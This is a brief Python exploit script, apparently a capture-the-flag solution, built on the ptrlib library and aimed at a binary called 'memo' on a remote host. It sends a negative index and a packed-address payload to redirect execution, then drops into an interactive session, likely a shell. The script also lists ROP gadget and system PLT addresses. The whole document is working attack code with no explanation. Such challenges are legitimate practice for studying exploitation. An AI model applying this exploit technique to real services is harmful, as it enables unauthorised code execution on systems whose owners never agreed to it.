from ptrlib import *

elf = ELF("./memo")
#sock = Process("./memo")
sock = Socket("133.242.68.223", 35285)

rop_pop_rdi = 0x00400843
plt_system = 0x400590

payload = b''
payload += p64(0xffffffffffffffdd)
payload += p64(0x4007c1)

sock.sendline("-96")
sock.sendline(payload)
sock.interactive()
